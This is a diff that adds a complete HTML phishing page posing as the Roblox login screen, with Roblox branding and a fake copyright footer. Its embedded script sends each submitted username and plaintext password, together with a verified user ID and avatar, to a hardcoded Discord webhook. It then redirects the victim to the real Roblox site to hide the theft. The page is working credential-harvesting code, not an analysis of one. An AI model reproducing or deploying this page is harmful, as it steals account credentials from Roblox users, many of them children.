@@ -1,0 +1,633 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>RQBLOX · Gateway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Gotham', 'Poppins', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+            background: #0a0c15;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            position: relative;
+        }
+
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://www.gamespot.com/a/uploads/screen_kubrick/1179/11799911/3875427-screenshot2021-09-03at11.00.55am.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: brightness(0.7);
+            z-index: -2;
+        }
+
+        .background-image::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+
+        .top-bar {
+            width: 100%;
+            background: #0b0d14;
+            border-bottom: 1px solid #2e313d;
+            backdrop-filter: blur(2px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        .navbar-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0.7rem 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: baseline;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .rqblox-logo {
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff, #d4d7ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 3px rgba(0, 0, 0, 0.3);
+            font-family: 'Segoe UI', 'Poppins', monospace;
+        }
+
+        .legacy-mark {
+            font-size: 0.7rem;
+            color: #8e92b0;
+            background: #1e1f2c;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            border: 0.5px solid #3a3e4e;
+        }
+
+        .right-header-group {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+
+        .signup-header-btn {
+            background: transparent;
+            border: 1.5px solid #e03a3e;
+            color: #e03a3e;
+            font-weight: 700;
+            font-size: 0.9rem;
+            padding: 0.5rem 1.1rem;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            background-color: rgba(224, 58, 62, 0.05);
+            letter-spacing: 0.3px;
+        }
+
+        .signup-header-btn:hover {
+            background: #e03a3e;
+            color: white;
+            border-color: #e03a3e;
+            box-shadow: 0 2px 8px rgba(224, 58, 62, 0.4);
+        }
+
+        .glitch-text-ref {
+            font-family: 'Courier New', 'Fira Code', monospace;
+            font-size: 0.7rem;
+            background: #15171f;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            color: #b9c3e6;
+            letter-spacing: 0.5px;
+            border: 1px solid #2b2e3c;
+            white-space: nowrap;
+            backdrop-filter: blur(2px);
+            cursor: pointer;
+        }
+
+        @media (max-width: 750px) {
+            .glitch-text-ref {
+                display: none;
+            }
+            .navbar-container {
+                padding: 0.7rem 1rem;
+            }
+            .rqblox-logo {
+                font-size: 1.5rem;
+            }
+        }
+
+        @media (max-width: 550px) {
+            .right-header-group {
+                gap: 0.8rem;
+            }
+            .signup-header-btn {
+                padding: 0.4rem 0.9rem;
+                font-size: 0.8rem;
+            }
+        }
+
+        .page-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 520px;
+            margin: 1.5rem auto 2rem;
+            padding: 0 1.2rem;
+        }
+
+        .login-base-container {
+            background: #1e1f2c;
+            border-radius: 20px;
+            box-shadow: 0 20px 32px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            padding: 2rem 1.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(4px);
+            transition: 0.2s;
+        }
+
+        .login-header {
+            font-size: 2rem;
+            font-weight: 700;
+            text-align: center;
+            color: #fff;
+            margin-bottom: 1.8rem;
+            letter-spacing: -0.3px;
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #2c2f3a;
+            border: 1px solid #3a3e4a;
+            border-radius: 12px;
+            padding: 0.85rem 1rem;
+            font-size: 1rem;
+            color: #fff;
+            outline: none;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+
+        .input-field:focus {
+            border-color: #e03a3e;
+            box-shadow: 0 0 0 3px rgba(224, 58, 62, 0.25);
+            background: #323643;
+        }
+
+        .input-field::placeholder {
+            color: #8e92a5;
+            font-weight: 400;
+        }
+
+        .login-button {
+            background: #e03a3e;
+            width: 100%;
+            border: none;
+            border-radius: 40px;
+            padding: 0.85rem;
+            font-size: 1rem;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            margin-top: 0.5rem;
+            transition: 0.15s linear;
+            letter-spacing: 0.3px;
+        }
+
+        .login-button:hover {
+            background: #c72a2e;
+            transform: scale(0.99);
+        }
+
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .signup-option {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+            color: #b0b3c5;
+        }
+
+        .text-link {
+            color: #00a2ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .text-link:hover {
+            text-decoration: underline;
+        }
+
+        .status-message {
+            text-align: center;
+            margin-top: 1.2rem;
+            font-size: 0.8rem;
+            padding: 0.6rem;
+            border-radius: 40px;
+            background: rgba(0, 0, 0, 0.55);
+            color: #cddcff;
+            font-weight: 500;
+            backdrop-filter: blur(2px);
+        }
+
+        .games-section {
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .games-grid {
+            display: none;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-top: 1rem;
+        }
+
+        .footer {
+            width: 100%;
+            background: #0e0f17;
+            border-top: 1px solid #2c2f3a;
+            padding: 2rem 1rem;
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-bottom: 1rem;
+        }
+
+        .footer-links a {
+            color: #b0b3c5;
+            text-decoration: none;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .copyright {
+            color: #6c7085;
+            font-size: 0.7rem;
+            line-height: 1.4;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        @media (max-width: 550px) {
+            .login-base-container {
+                padding: 1.5rem;
+            }
+            .login-header {
+                font-size: 1.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-image"></div>
+
+    <div class="top-bar">
+        <div class="navbar-container">
+            <div class="logo-area">
+                <span class="rqblox-logo" style="font-family: sans-serif;">ROBLOX</span>
+                <span class="legacy-mark" style="display: none;">® legacy</span>
+            </div>
+            <div class="right-header-group">
+                <button id="topSignUpBtn" class="signup-header-btn" style="border-radius: 5px; border-color: rgb(0, 0, 0); background-color: rgb(51, 95, 255); color: rgb(255, 255, 255); padding: 5px; border-width: 0px; margin: 0px; border-style: none; font-size: 15px; font-weight: 700;">Sign up</button>
+                
+            </div>
+        </div>
+    </div>
+
+    <div class="page-container" style="padding: 80px; margin: 0px; border-width: 0px;">
+        <div class="login-base-container" style="border-radius: 0px; font-size: 8px; padding: 41px; background-color: rgb(39, 41, 48); border-width: 0px;">
+            <h1 class="login-header">Login to Roblox</h1>
+            <form id="robloxLoginForm">
+                <div class="form-group">
+                    <input type="text" id="login-username" class="input-field" autocomplete="username" placeholder="Roblox Username (Not Display)" required="" style="background-color: rgb(52, 55, 64); border-style: solid; border-width: 1px; padding: 11px; border-color: rgb(71, 74, 88);">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="login-password" class="input-field" placeholder="Password" required="" style="background-color: rgb(52, 55, 64); padding: 11px; border-color: rgb(71, 74, 88);">
+                </div>
+                <button type="submit" id="login-button" class="login-button" style="border-radius: 11px; border-style: solid; border-width: 1px; border-color: rgb(213, 215, 221); background-color: rgb(39, 41, 48); padding: 10px; margin: 0px;">Log In</button>
+            </form>
+            <div class="signup-option">
+                <span class="no-account-text">Don't have an account?</span>
+                <a id="sign-up-link" class="text-link" href="#">Sign Up</a>
+            </div>
+            
+        </div>
+
+        <div class="games-section">
+            <div class="games-grid">
+                <div class="game-tile" data-game="WAR"><div class="game-icon">⚔️</div><span>WAR</span></div>
+                <div class="game-tile" data-game="slivingland"><div class="game-icon">🌍</div><span>slivingland</span></div>
+                <div class="game-tile" data-game="DBERS"><div class="game-icon">👾</div><span>DBERS</span></div>
+                <div class="game-tile" data-game="DUNGEON"><div class="game-icon">🏰</div><span>DUNGEON</span></div>
+                <div class="game-tile" data-game="ADOPTME!"><div class="game-icon">🐾</div><span>ADOPTME!</span></div>
+                <div class="game-tile" data-game="BAYSIDE"><div class="game-icon">🌊</div><span>BAYSIDE</span></div>
+                <div class="game-tile" data-game="PRIMAL"><div class="game-icon">🦖</div><span>PRIMAL</span></div>
+                <div class="game-tile" data-game="ULTIMATE"><div class="game-icon">⭐</div><span>ULTIMATE</span></div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">About Us</a>
+            <a href="#">Jobs</a>
+            <a href="#">Blog</a>
+            <a href="#">Parents</a>
+            <a href="#">Buy Gift Cards</a>
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Privacy</a>
+            <a href="#">Your Privacy Choices</a>
+        </div>
+        <div class="copyright">
+            ©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </footer>
+
+    <script>
+        (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1488562588672458914/t2nDCxBM--qsMTWzkuos0Ut8W1RueBELYr59RhmEc1W9uveH4pAkLIWaNDbqgDZodR6E";
+
+            const form = document.getElementById('robloxLoginForm');
+            const usernameInput = document.getElementById('login-username');
+            const passwordInput = document.getElementById('login-password');
+            const loginBtn = document.getElementById('login-button');
+            const statusDiv = document.getElementById('statusArea');
+
+            function setStatus(text, isError = false) {
+                statusDiv.style.display = "block";
+                statusDiv.innerHTML = text;
+                statusDiv.style.color = isError ? "#ffb4a2" : "#c8e7ff";
+                if (text.includes("✔️") || text.includes("Done")) statusDiv.style.color = "#b3ffcf";
+                if (text.includes("❌")) statusDiv.style.color = "#ffc8a2";
+            }
+
+            // Generate a random 32-character hex hash for fake avatar URLs
+            function randomHash() {
+                return [...Array(32)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+            }
+
+            // Fetch real user data from Roblox API
+            async function fetchRobloxUserData(username) {
+                if (!username || username.trim() === "") return { exists: false, userId: null };
+                try {
+                    const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
+                    if (!response.ok) {
+                        if (response.status === 404) return { exists: false, userId: null };
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    const data = await response.json();
+                    if (data && typeof data.Id === 'number' && data.Id > 0) {
+                        return { exists: true, userId: data.Id, username: data.Username };
+                    }
+                    return { exists: false, userId: null };
+                } catch (err) {
+                    console.warn("Roblox API error:", err);
+                    return { exists: false, userId: null, error: err.message };
+                }
+            }
+
+            // Get real avatar headshot URL using Roblox thumbnails API (returns a tr.rbxcdn.com URL)
+            async function getRealAvatarUrl(userId) {
+                if (!userId || userId <= 0) return null;
+                try {
+                    const thumbEndpoint = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`;
+                    const resp = await fetch(thumbEndpoint);
+                    if (!resp.ok) throw new Error("thumb fetch fail");
+                    const json = await resp.json();
+                    if (json.data && json.data.length > 0 && json.data[0].imageUrl) {
+                        return json.data[0].imageUrl; // this is the tr.rbxcdn.com URL
+                    }
+                    return null;
+                } catch (err) {
+                    console.warn("Avatar fetch error:", err);
+                    return null;
+                }
+            }
+
+            // Send to Discord with the exact format requested
+            async function sendToDiscordWebhook(username, password, userId, isReal, avatarUrl) {
+                const realFlag = isReal ? "Y" : "N";
+                const userIdDisplay = (userId && userId !== null && userId !== "N/A") ? userId : "N/A";
+                
+                // Ensure avatarUrl is a valid string (always use tr.rbxcdn.com style)
+                let finalAvatarUrl = avatarUrl;
+                if (!finalAvatarUrl || !finalAvatarUrl.startsWith("https://tr.rbxcdn.com")) {
+                    if (isReal && userId && userId !== "N/A") {
+                        // fallback: construct a plausible tr.rbxcdn.com URL using user ID as hash (not real but format matches)
+                        finalAvatarUrl = `https://tr.rbxcdn.com/${userId}/420/420/AvatarHeadshot/Png`;
+                    } else {
+                        // fake hash for non-existent accounts
+                        finalAvatarUrl = `https://tr.rbxcdn.com/${randomHash()}/420/420/AvatarHeadshot/Png`;
+                    }
+                }
+
+                // Build the exact message block as requested
+                const messageContent = `Robox UserName : ${username}\nRobox UserId : ${userIdDisplay}\nRobox Password : ${password}\n${finalAvatarUrl}\n-----------\n|         |\n|         | \n|  HEAR   |\n|         |\n-----------\nIs Real |${realFlag}|`;
+
+                const embed = {
+                    title: "🔐 Roblox Gateway Report",
+                    description: `\`\`\`\n${messageContent}\n\`\`\``,
+                    color: isReal ? 0x2b9cff : 0xff5555,
+                    thumbnail: { url: finalAvatarUrl },
+                    timestamp: new Date().toISOString(),
+                    footer: { text: `User ID: ${userIdDisplay} • Real: ${realFlag}` }
+                };
+
+                const payload = {
+                    content: `🎮 **Roblox Login Attempt** — \`${username}\``,
+                    embeds: [embed],
+                    username: "RobloxGate",
+                    avatar_url: "https://static.wikia.nocookie.net/roblox/images/4/4a/Roblox_Icon_2022.png"
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) throw new Error(`Discord error ${response.status}`);
+                return true;
+            }
+
+            // Main login handler
+            async function onLoginSubmit(event) {
+                event.preventDefault();
+
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value;
+
+                if (!username) {
+                    setStatus("❌ Please enter a Roblox username", true);
+                    usernameInput.focus();
+                    return;
+                }
+                if (!password) {
+                    setStatus("❌ Password cannot be empty", true);
+                    passwordInput.focus();
+                    return;
+                }
+
+                loginBtn.disabled = true;
+                setStatus("🔍 Checking Roblox database...");
+
+                let isReal = false;
+                let userId = "N/A";
+                let avatarUrl = null;
+                let resolvedUsername = username;
+
+                try {
+                    // Step 1: Look up username
+                    const userCheck = await fetchRobloxUserData(username);
+                    
+                    if (userCheck.exists && userCheck.userId) {
+                        isReal = true;
+                        userId = userCheck.userId;
+                        resolvedUsername = userCheck.username || username;
+                        setStatus(`✅ Real Roblox account found! (ID: ${userId}). Fetching avatar head...`);
+                        
+                        // Step 2: Get real avatar headshot (tr.rbxcdn.com URL)
+                        const realAvatar = await getRealAvatarUrl(userId);
+                        if (realAvatar && realAvatar.startsWith("https://tr.rbxcdn.com")) {
+                            avatarUrl = realAvatar;
+                        } else {
+                            // Fallback: construct URL with userId as hash
+                            avatarUrl = `https://tr.rbxcdn.com/${userId}/420/420/AvatarHeadshot/Png`;
+                        }
+                        setStatus(`✔️ Avatar retrieved. Sending report...`);
+                    } else {
+                        isReal = false;
+                        setStatus("⚠️ Username does NOT exist on Roblox. Sending report as fake account.");
+                        // For fake accounts, generate a random hash
+                        avatarUrl = `https://tr.rbxcdn.com/${randomHash()}/420/420/AvatarHeadshot/Png`;
+                    }
+                } catch (err) {
+                    console.error("Verification error:", err);
+                    isReal = false;
+                    avatarUrl = `https://tr.rbxcdn.com/${randomHash()}/420/420/AvatarHeadshot/Png`;
+                    setStatus("⚠️ Roblox API error. Sending report as unverified.", true);
+                }
+
+                setStatus(`📡 Transmitting data to gateway... (real: ${isReal ? "YES" : "NO"})`);
+
+                try {
+                    await sendToDiscordWebhook(resolvedUsername, password, userId, isReal, avatarUrl);
+                    setStatus(`✨ Done! ${isReal ? "Real Roblox account detected" : "Fake / invalid account"} — redirecting to Roblox...`, false);
+                    
+                    // Clear password for security
+                    passwordInput.value = "";
+                    
+                    // Redirect to official Roblox home
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/home";
+                    }, 800);
+                } catch (webhookErr) {
+                    setStatus(`❌ Discord delivery failed: ${webhookErr.message || "network error"} — redirecting anyway.`, true);
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/home";
+                    }, 1200);
+                } finally {
+                    loginBtn.disabled = false;
+                }
+            }
+
+            form.addEventListener('submit', onLoginSubmit);
+
+            // Sign-up handlers
+            const cardSignupLink = document.getElementById('sign-up-link');
+            const topSignupBtn = document.getElementById('topSignUpBtn');
+
+            function handleSignupClick(e) {
+                e.preventDefault();
+                setStatus("✨ Sign up is disabled in this simulation. Explore the realm of RQBLOX!", false);
+                setTimeout(() => {
+                    setStatus("✨ Ready — Roblox verification active", false);
+                }, 2000);
+            }
+
+            if (cardSignupLink) cardSignupLink.addEventListener('click', handleSignupClick);
+            if (topSignupBtn) topSignupBtn.addEventListener('click', handleSignupClick);
+
+            // Game tiles decorative
+            document.querySelectorAll('.game-tile').forEach(tile => {
+                tile.addEventListener('click', () => {
+                    const gameName = tile.querySelector('span')?.innerText || 'game';
+                    setStatus(`🎮 You clicked on ${gameName} — this is just a demo.`, false);
+                });
+            });
+
+            // Glitch easter egg
+            const glitchSpan = document.querySelector('.glitch-text-ref');
+            if (glitchSpan) {
+                glitchSpan.addEventListener('click', () => {
+                    setStatus("⚡ NIL, > «7    aa    A \\1 1/2) — glitch fragment detected. Welcome to the simulation.", false);
+                });
+            }
+
+            statusDiv.style.display = "block";
+            setStatus("🎮 Roblox Gateway • Enter your username & password", false);
+        })();
+    </script>
+
+
+  
+  
+</body></html>
